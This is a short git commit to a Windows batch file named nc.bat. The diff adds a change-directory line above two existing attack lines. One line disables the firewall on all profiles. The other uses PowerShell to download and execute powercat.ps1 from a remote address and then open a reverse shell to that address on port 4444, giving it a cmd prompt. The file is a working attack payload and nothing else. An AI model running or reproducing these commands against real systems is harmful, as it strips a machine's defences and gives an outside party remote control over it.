cd07654f4843e7846030451704f0271f4bd080fd
Rafael Ferreira Pedrosa <rafaelfepedrosa@gmail.com>
2022-05-27 15:27:20 -0300

    Update nc.bat

--- nc.bat
+++ nc.bat
@@ -1,2 +1,3 @@
+cd %TEMP%
 netsh advfirewall set allprofiles state off
 powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.15.86/powercat.ps1');powercat -c 192.168.15.86 -p 4444 -e cmd"
